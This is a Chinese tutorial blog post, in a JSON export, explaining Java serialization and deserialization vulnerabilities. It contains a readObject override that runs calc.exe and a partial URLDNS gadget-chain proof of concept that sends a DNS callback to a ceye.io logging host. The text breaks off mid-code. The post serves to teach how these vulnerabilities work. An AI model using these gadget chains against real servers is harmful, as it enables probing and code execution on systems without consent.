{"title":"JAVA 序列化与反序列","uid":"2c9429693145cc0d21b44994a72f05fa","slug":"JAVA序列化与反序列化","date":"2023-05-31T18:51:30.000Z","updated":"2023-09-03T13:12:36.000Z","comments":true,"path":"api/articles/JAVA序列化与反序列化.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032112394.jpeg","content":"<h1 id=\"JAVA序列化与反序列化\"><a href=\"#JAVA序列化与反序列化\" class=\"headerlink\" title=\"JAVA序列化与反序列化\"></a>JAVA序列化与反序列化</h1><p>JAVA序列化是指把JAVA对象转换为字节序列的过程；反序列化是指把字节序列恢复为JAVA对象的过程。</p>\n<p>接下来首先看一个简单的例子。</p>\n<p>我们首先来自定义一下<code>Main</code>类，给它赋予两个变量，<code>name</code>和<code>age</code>，具体代码如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Serializable</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Serializable</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Main&#123;\"</span> <span class=\"token operator\">+</span>\n                <span class=\"token string\">\"name='\"</span><span class=\"token operator\">+</span>name<span class=\"token operator\">+</span><span class=\"token char\">'\\''</span><span class=\"token operator\">+</span>\n                <span class=\"token string\">\"age=\"</span><span class=\"token operator\">+</span>age<span class=\"token operator\">+</span>\n                <span class=\"token char\">'&#125;'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来自定义JAVA序列化函数，具体代码如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileOutputStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutput</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> serialize <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">ObjectOutputStream</span> oos<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Main</span> main <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Main</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"aa\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//System.out.println(main);</span>\n        <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里呢，其实就是写了一个文件输出流，将写入的内容传至<code>ser.bin</code>中，而后调用了<strong>writeObject</strong>方法实现了序列化。</p>\n<p>而后定义主函数，实例化对象并传入<strong>name=aa,age=22</strong>，并序列化<strong>main对象</strong>。接下来运行此程序</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937272.png\" alt=\"image-20230523161521696\"></p>\n<p>接下来再自定义一下反序列化函数，反序列化与序列化相反即可，把<strong>Output</strong>换成<strong>Input</strong>，把<strong>write</strong>改为<strong>read</strong>，具体代码如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> unserialize <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token class-name\">Filename</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">ObjectInputStream</span> ois<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> obj<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Main</span> main <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Main</span><span class=\"token punctuation\">)</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时运行程序，可以发现成功对数据进行了反序列化并输出了数据</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937259.png\" alt=\"image-20230523161912008\"></p>\n<p>可以发现主函数中有这样一段代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Serializable</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>他其实是实现了一个接口，如果没有这个**implements Serializable **，就无法实现正常的序列化</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937249.png\" alt=\"image-20230523164616173\"></p>\n<h3 id=\"序列化实现的一些特点\"><a href=\"#序列化实现的一些特点\" class=\"headerlink\" title=\"序列化实现的一些特点\"></a>序列化实现的一些特点</h3><p>1、<strong>静态成员变量不能被序列化</strong></p>\n<p>序列化是针对对象属性的，而静态成员变量是属于类的</p>\n<p>2、<strong>transient标识的对象成员变量不参与序列化</strong></p>\n<p>这个可以用上面的示例进行测试，我们在name前添加上<code>transient</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937226.png\" alt=\"image-20230523170809370\"></p>\n<p>接下来重新进行序列化和反序列化，可以发现</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937352.png\" alt=\"image-20230523170841785\"></p>\n<p>此时的name变成了<code>null</code></p>\n<h3 id=\"JAVA反序列化安全问题\"><a href=\"#JAVA反序列化安全问题\" class=\"headerlink\" title=\"JAVA反序列化安全问题\"></a>JAVA反序列化安全问题</h3><h4 id=\"为什么会产生漏洞\"><a href=\"#为什么会产生漏洞\" class=\"headerlink\" title=\"为什么会产生漏洞\"></a>为什么会产生漏洞</h4><p>服务端进行反序列化数据时，会自动调用类中的<code>readObject</code>代码，给予了攻击者在服务器上运行代码的能力</p>\n<h4 id=\"可能形式\"><a href=\"#可能形式\" class=\"headerlink\" title=\"可能形式\"></a>可能形式</h4><p>1、入口类的<code>readObject</code>直接调用危险函数</p>\n<p>比如上述的例子中，我们重写<strong>readObject</strong>方法，添加一个弹计算器的指令</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">private void readObject(ObjectInputStream ois) throws Exception,ClassNotFoundException&#123;\n    ois.defaultReadObject();\n    Runtime.getRuntime().exec(&quot;calc.exe&quot;);\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937279.png\" alt=\"image-20230523173225747\"></p>\n<p>此时再进行序列化和反序列化</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291937294.png\" alt=\"image-20230523174013839\"></p>\n<p>成功弹出计算器</p>\n<p>2、入口类参数中包含可控类，该类含有危险方法，<code>readObject</code>时进行调用</p>\n<p>3、入口类参数中包含可控类，该类调用其他有危险方法的类，<code>readObject</code>时进行调用</p>\n<p>4、构造函数/静态代码块等类加载时隐式执行。</p>\n<p>共同条件 </p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">1</span>、继承<span class=\"token class-name\">Serialize</span>\n<span class=\"token number\">2</span>、入口类<span class=\"token function\">source</span><span class=\"token punctuation\">(</span>重写readObject 参数类型广泛 最好是JDK自带的<span class=\"token punctuation\">)</span>\n<span class=\"token number\">3</span>、调用链 gadget chain\n<span class=\"token number\">4</span>、执行类 sink <span class=\"token punctuation\">(</span>rce、ssrf写文件等等<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>接下来以<code>HashMap</code>为例，说一下如何寻找可用类。</p>\n<p>首先它需要继承有<strong>Serializable</strong>类，因为没有<strong>Serializable</strong>就无法进行序列化</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305291948245.png\" alt=\"image-20230529194842139\"></p>\n<p>可以看到类<code>HashMap</code>继承了<code>Serializable</code></p>\n<p>接下来寻找入口类。</p>\n<p>点击<code>Strcture</code>，可以看到<code>HashMap</code>下的<code>readObject</code>类中存在这样一段代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> mappings<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token class-name\">K</span> key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">)</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token class-name\">V</span> value <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">)</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">putVal</span><span class=\"token punctuation\">(</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305292006218.png\" alt=\"image-20230529200631004\"></p>\n<p>重点其实就是对<strong>key</strong>和<strong>value</strong>进行了<code>readObject</code>函数处理，而后将这两个变量放进了<code>hash</code>函数中，接下来跟进此方法</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305292013647.png\" alt=\"image-20230529201306583\"></p>\n<p>当key不为<code>0</code>时，就会给<code>h</code>赋值为<code>hashCode函数处理过后</code>的<code>key</code>方法</p>\n<p>符合入口类的条件，即<strong>重写 readObject 调用常见的函数</strong></p>\n<h3 id=\"URLDNS原理分析\"><a href=\"#URLDNS原理分析\" class=\"headerlink\" title=\"URLDNS原理分析\"></a>URLDNS原理分析</h3><p><code>URLDNS</code>是<code> ysoserial</code>中⼀个利⽤链的名字，这里之所以选择它来进行相关讲解是因为他足够简单，但它其实不能称为<code>利用链</code>，因为参数并非可利用的命令，而是一个<code>URL</code>，同时它触发的结果也并非命令执行，而是一次<code>DNS请求</code>。但它有以下优点:</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">1</span>、使⽤ <span class=\"token class-name\">Java</span> 内置的类构造，对第三⽅库没有依赖。\n<span class=\"token number\">2</span>、在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>因此用它来测试反序列化漏洞是否存在是尤为合适的。</p>\n<p>我们可以在<code>ysoserial</code>查看它的利用链</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">Gadget</span> <span class=\"token class-name\">Chain</span><span class=\"token operator\">:</span>\n  <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">putVal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n      <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        URL<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>只有寥寥几步，接下来跟着复现一下。</p>\n<p>常见的HTTP请求使用的是URL类，URL是由HashMap的Put方法产生的，所以我们这里先跟进<code>Put</code>方法</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305302341461.png\" alt=\"image-20230530234129375\"></p>\n<p>从该方法中我们可以看出这里调用了<code>hash()</code>方法，所以接下来我们跟进这个方法</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305302342244.png\" alt=\"image-20230530234241216\"></p>\n<p>这里可以看到<code>hashCode</code>处理的变量是<code>Key</code>，而<code>Key</code>则是我们上文<code>hash</code>中传入的参数，也就是我们之前写的内容</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">hashmap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://xxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 传进去两个参数，key = 前面那串网址，value = 1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来我们跟进<code>URL</code>，看<code>URL</code>中的<code>hashCode</code>方法。</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305302347865.png\" alt=\"image-20230530234713826\"></p>\n<p>可以发现当<code>hashCode</code>不等于<code>-1</code>时，直接返回<code>hashCode</code>，否则就会对<code>handler</code>进行另一个类的<code>hashCode</code>方法处理，接下来跟进这个<code>hashCode</code>函数</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305302352277.png\" alt=\"image-20230530235211239\"></p>\n<p>可以发现对内容进行了<code>getHostAddress</code>方法处理，继续跟进</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202305302353329.png\" alt=\"image-20230530235313304\"></p>\n<p>根据主机名获取其IP地址，也就是对其发送了一次DNS请求。</p>\n<p>至此，可以看出总体链如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">1</span>、<span class=\"token class-name\">HashMap</span><span class=\"token operator\">-></span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">2</span>、<span class=\"token class-name\">HashMap</span><span class=\"token operator\">-></span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">3</span>、URL<span class=\"token operator\">-></span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">4</span>、<span class=\"token class-name\">URLStreamHandler</span><span class=\"token operator\">-></span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">5</span>、<span class=\"token class-name\">URLStreamHandler</span><span class=\"token operator\">-></span><span class=\"token function\">getHostAddress</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>接下来构造Poc进行DNS请求尝试。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span> hashmap<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \nhashmap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://s3moz8.ceye.io\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>hashmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时运行会发现，我们还没进行反序列化，在此时就直接收到DNS请求了，这是为啥呢，仔细看一下代码，会发现</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">PUT<span class=\"token operator\">-></span>hash<span class=\"token operator\">-></span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而URL类中的<code>hashCode</code>默认值为-1，此时到这里就会直接往下运行，也就是对URL发起了DNS请求。</p>\n<p>这样的话我们就无法判断是反序列化出来的URLDNS，还是序列化中的URLDNS，造成了干扰，此时我们该怎么办呢，我们可以看到这里的源头是因为**put()**，所以我们可以先不发送请求</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">#<span class=\"token class-name\">Serialization</span><span class=\"token punctuation\">.</span>java\n<span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileOutputStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Serialization</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">Serialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">ObjectOutputStream</span> oos<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span> hashmap<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">URL</span> url <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token 